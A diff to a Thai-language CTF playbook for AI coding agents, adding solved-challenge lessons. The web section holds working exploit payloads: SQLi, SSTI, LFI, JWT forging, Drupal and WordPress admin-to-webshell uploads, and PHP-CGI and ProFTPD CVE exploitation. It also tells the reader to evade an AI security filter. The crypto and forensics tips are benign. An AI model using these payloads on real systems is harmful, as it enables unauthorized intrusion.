@@ -6,7 +6,7 @@ compatibility: claude, claude-code, chatgpt, codex, opencode
 metadata:
   author: sunshine
   language: th
-  version: "2.0"
+  version: "2.1"
 ---
 
 # CTF Skill by Sunshine
@@ -350,8 +350,22 @@ Full toolbox: read `references/TOOLS.md`. Below is the 1-line essence per catego
 
 ### 1. Web Exploitation
 - Recon: `whatweb`, `feroxbuster/dirsearch`, `Burp`, ดู source, cookie, header, JS.
-- Backup dirs (เช็คทุกครั้ง + autoindex): `/_baks/`, `/_backup/`, `/backup/`, `/*.bak,*.old,*~`.
-- Common: SQLi (`' OR 1=1-- -`, UNION), XSS, SSTI (`{{7*7}}`), LFI (`../../etc/passwd`), IDOR, JWT (`alg:none`), file upload (`.phtml`, double ext), SSRF, RCE.
+- Backup dirs (เช็คทุกครั้ง + autoindex): `/_baks/`, `/_backup/`, `/backup/`, `/*.bak,*.old,*~` — เคยเจอ flag เป็นชื่อไฟล์ + `recovery_token` ใน `.bak` (TCTT2026 Naomi Bay).
+- Common: SQLi (`' OR 1=1-- -`, UNION), XSS, SSTI (`{{7*7}}`), LFI (`../../etc/passwd`), IDOR, JWT (`alg:none`), file upload (`.phtml`, double ext), SSRF, RCE, CMS admin feature abuse (Drupal module upload / WordPress plugin+theme editor).
+- JitCommerce lesson (2026): `/image?file=` LFI -> `../../app/config/secret.txt` -> forge JWT `role:admin` -> `/api/verify-token` ได้ flag. จำ: ใช้ `UA Mozilla` กัน `Aegis AI Shield` block.
+- SQLi login JSON (2026): `POST JSON {"username":"admin'-- -","password":"x"}` -> `WHERE name='admin'--` ได้ `cspp{...}` ทันที ไม่ต้อง sqlmap
+- SSRF preview (2026): `/fetch?url=http://127.0.0.1/flag` ได้ `cspp{...}` ทันที ถ้าเจอ `internal service: try /flag` คือมาถูกทางแล้ว
+- SSTI render (2026): `POST {"name":"{{7*7}}"}` -> `Hello, 49!` ยืนยันได้ แล้ว `{{config}}` / `{{flag}}` คาย `cspp{...}` ทันที ไม่ต้อง chain `__class__` (โดนกรองว่าง)
+- Traversal file API (2026): `GET /file?name=../secret/flag.txt` ใช้ `../` ดิบๆ ได้ `cspp{...}` ห้าม encode `%2F`
+- Drupal admin -> RCE (2026): Drupal 8.5.3 + `admin:password` -> `/admin/modules/install` อัปโหลดโมดูล `.tar.gz` ที่เขียนเอง (`info.yml` + `routing.yml` + Controller รัน `shell_exec`) -> แตกไป `/modules/<mod>` -> enable ที่ `/admin/modules` -> `GET /<mod>?c=id` ได้ `uid=33(www-data)`; flag อยู่ `/var/www/html/flag_<random>.txt` (`start.sh` สุ่มชื่อด้วย `sha256sum|base64|head -c5`) ใช้ `python tools/drupal_admin_rce.py --url ... --user ... --pass ... --cmd id` — ระวัง wrapper ของ flag แต่ละเวทีไม่ใช่ `cspp{}` เสมอ (ข้อนี้เป็น `pg{...}`) ให้ใช้ค่าดิบจากไฟล์ ห้ามเดา prefix
+- Drupalgeddon2 (CVE-2018-7600) บน 8.5.3: POST `/user/register?element_parents=account/mail/%23value&_wrapper_format=drupal_ajax` คืน 200 แต่ได้แค่ HTML ฟอร์ม ไม่มี output `id` = ไม่ exec → ถ้ามี admin cred ให้ไปทาง module upload ก่อน อย่าเสียเวลา
+- Cache trap: route ที่เพิ่งสร้างอาจถูก internal page cache ของ anonymous แคช → ได้ output ซ้ำของคำสั่งเก่า; แก้ด้วยการยิงด้วย cookie admin, ใส่ cache-buster `&x=random`, และใส่ `'#cache' => ['max-age' => 0]` ใน render array
+- WordPress admin -> RCE (2026): WP 4.9.8 + `admin:P@ssw0rd` -> `GET /wp-admin/plugin-install.php?tab=upload` เอา `_wpnonce` -> `POST /wp-admin/update.php?action=upload-plugin` (field `pluginzip`) -> เรียก `/wp-content/plugins/<slug>/<slug>.php?c=id` ตรงๆ ได้ `uid=33(www-data)` (ไม่ต้อง activate); flag อยู่ `/var/www/html/secret_<random>.txt` (`start.sh` สุ่มชื่อด้วย `sha256sum|base64|head -c5`) ใช้ `python tools/wordpress_admin_rce.py --url ... --user ... --pass ... --cmd id`
+- WP redirect trap: `siteurl` ใน DB อาจชี้ IP อื่น (คนละตัวกับ Target Address) ทำให้ `/wp-admin/` 302 ไป host ที่ต่อไม่ติด -> ใช้ `allow_redirects=False`, ตั้ง cookie `wordpress_test_cookie` ก่อน login, และยึด session cookie ไว้ อย่า follow redirect
+- WP ทางเลือกอื่น: Appearance > Theme Editor (`theme-editor.php`) แก้ `404.php` ใส่ `shell_exec` (ถ้าไม่ได้ตั้ง `DISALLOW_FILE_EDIT`), Plugin Editor แก้ `hello.php`, หรือ `admin-ajax.php` ผ่าน plugin ที่ activate; จำว่า admin CMS = RCE
+- PHP-CGI argument injection (CVE-2012-1823, 2026): query string ถูกส่งเป็น argv ของ php-cgi -> `GET /index.php?-s` คาย source ทั้งไฟล์ทันที (ข้อนี้ flag อยู่ในคอมเมนต์ `//The flag is cve{...}`); ต่อยอด RCE ด้วย `POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input` body `<?php system($_GET[0]); ?>` -> `uid=33(www-data)` ใช้ `python tools/php_cgi_cve_2012_1823.py --url .../index.php --source` หรือ `--cmd id`; เช็คด้วยว่า path แบบ `/index.php/foo` ยังรัน PHP = น่าจะเป็น CGI เก่า
+- ProFTPD mod_copy (CVE-2015-3306, 2026): `SITE CPFR <src>` + `SITE CPTO <dst>` = คัดลอกไฟล์ฝั่งเซิร์ฟเวอร์ และทำงานได้**แม้ยังไม่ login** -> copy `/etc/passwd` ไป `/var/www/html/x.txt` แล้ว GET ผ่าน HTTP ได้ทันที (เขียน webroot ได้ = วาง PHP shell = RCE); ข้อนี้ `/start.sh` แอบ `mv /tmp/flag.txt -> /tmp/flag_<5>.txt` โดย `<5> = base64( sha256("<epoch>\n") hexdigest + "  -\n" )[:5]` และ epoch = `btime + starttime/100` จาก `/proc/stat` + `/proc/1/stat` (± ไม่กี่วิ) -> brute ไม่กี่พันชื่อก็เจอ ใช้ `python tools/proftpd_modcopy_cve_2015_3306.py --host target --find-flag --web http://target` (หรือ `--read /start.sh`)
+- กับดักการคำนวณชื่อไฟล์: `date +%s | sha256sum | base64` = base64 ของ "hex digest + 2 spaces + dash + newline" **ไม่ใช่** digest ดิบ; ถ้าคำนวณผิดจะไม่เจอไฟล์เลย (ข้อนี้พลาดรอบแรก)
 - Flow: `Found: input -> reflection/filter` / `Means: bypass ได้ไหม` / `Next: payload เดียว`.
 
 ### 2. Reverse Engineering
@@ -366,9 +380,18 @@ Full toolbox: read `references/TOOLS.md`. Below is the 1-line essence per catego
 - Checklist: RSA -> `n,e,c`? `n` factor ได้ไหม? `e` เล็ก? common modulus?; AES ECB -> pattern ซ้ำ?; XOR -> key reuse?; hash -> `hash-identifier`, `john/hashcat`.
 - Tools: `CyberChef`, `sagemath`, `rsactftool`, `factordb`.
 - Flow: `Found: e=3, n 512-bit` / `Means: อาจ low-e / factor ได้` / `Next: ลอง factordb + yafu`.
+- Caesar lesson (2026): `jzww{la_ab_iybal}` brute 26 ตัว -> shift -7 ได้ `cspp{et_tu_brute}` (`et tu brute` วลี Caesar) จำ: เจอคำใบ้ Caesar ให้ brute ทั้ง header+body ทันที อย่าตัด header ทิ้ง.
+- ROT13 lesson (2026): `pfcc{ebg13_vf_n_pnrfne}` -> `cspp{rot13_is_a_caesar}` ด้วย `codecs.decode(s,'rot_13')` ทีเดียวจบ.
+- Atbash lesson (2026): `xhkk{nriili_nriili_dzoo}` -> `cspp{mirror_mirror_wall}` ด้วย `a<->z` ทีเดียวจบ อย่าตัด header.
+- Vigenere lesson (2026, corrected): `fmrz{ycioqyto_nyac_puvdhl}` + format `cspp{...}` -> `K=C-P` ได้ `DUCK` -> ถอดทั้ง header+body ได้ `cspp{vigenere_keys_matter}` จำ: ถอดทั้งเส้น อย่าเก็บ `fmrz` ไว้.
 
 ### 4. Forensics
 - Recon: `file`, `exiftool`, `binwalk -e`, `foremost`, `strings | grep -i flag`, `zsteg/steghide`, `wireshark/tshark`.
+- Strings lesson (2026): ไฟล์ junk มี flag ซ่อนบรรทัดเดียว -> `strings -n 4 file.dat | grep -Eo 'cspp\{[^}]+\}'` ได้ทันที ไม่ต้องไล่อ่านทั้งไฟล์
+- EXIF lesson (2026): dump metadata มี flag ใน `User Comment` -> `grep -i 'comment\|cspp'` ได้ `cspp{exif_says_too_much}` ทันที เช็ค text field ก่อนพิกัด GPS
+- Polyglot lesson (2026): PNG ใหญ่เกินพิกเซล -> สแกน `PK\x03\x04` หลัง `IEND` carve แล้ว `unzip` ได้ `cspp{z1p_appended_after_iend}` ไฟล์ใหญ่เกินจริงเช็ค appended ZIP ก่อน LSB
+- Matryoshka lesson (2026): zip ซ้อนกันหลายชั้น -> `python ${SKILL_DIR}/scripts/unzip_recursive.py nested.zip` วนแตกจนสุด ได้ `cspp{m4tryoshka_z1p_dolls}`
+- PCAP plaintext lesson (2026): cap มีแค่ 1 packet, `io,phs` โชว์ stack จบที่ `http > urlencoded-form` -> `strings capture.pcap | grep -i cspp` เจอ body ดิบตรงๆทันที (ไม่ต้องเปิด Wireshark GUI ก่อน) ยืนยันซ้ำด้วย `tshark -r capture.pcap -Y http -T fields -e http.file_data` (ได้ hex -> `bytes.fromhex(...).decode()`) ได้ `cspp{http_p0st_sn1ffed}` จำ: เจอ pcap ให้เช็ค `tshark -q -z io,phs` ก่อนเสมอ ถ้า stack เป็น HTTP ธรรมดา (ไม่ใช่ TLS) แปลว่า plaintext ลอง `strings` ก่อนเลย เร็วกว่าไล่ทีละ packet มาก.
 - Images: `pngcheck`, LSB, `apngdis`, QR; PCAP: `tshark -Y http`, `follow tcp stream`; Memory: `volatility`.
 - Flow: `Found: PNG + hidden zip (binwalk)` / `Means: zipped flag?` / `Next: binwalk -e + foremost`.
 
@@ -382,6 +405,9 @@ Full toolbox: read `references/TOOLS.md`. Below is the 1-line essence per catego
 ### 6. Miscellaneous / Misc
 - Recon: `file`, ดูว่าเป็น coding / OSINT / trivia / blockchain / AI prompt injection? ถ้าเจอ `0/1` กลุ่มละ 8 bit -> binary decode ทันที
 - Common: `python jail` (`__class__`, `__subclasses__`), QR/barcode, esoteric lang (`brainfuck`), audio SSTV, Discord OSINT.
+- Binary lesson (2026): `01100011 ...` -> `python -c "print(''.join(chr(int(b,2)) for b in s.split()))"` ได้ `cspp{b1nary_t0_ascii}`
+- Acrostic lesson (2026): กลอนอักษรแรกได้ `READFIRSTLETTERS` -> lowercase ห่อ `cspp{...}` ได้ `cspp{readfirstletters}` เจอคำใบ้ shape/acrostic ดึงอักษรแรกก่อนเสมอ
+- Zero-width lesson (2026): `U+200B=0/U+200C=1` 8 บิตต่อไบต์ -> `cspp{zer0_width_ninja}` เจอข้อความมองไม่เห็นให้นับ zero-width ก่อน
 - Flow: `Found: jail block os/system แต่ใช้ __builtins__ ได้` / `Means: bypass ด้วย getattr` / `Next:().__class__.__base__.__subclasses__()`.
 
 ### 7. Mobile
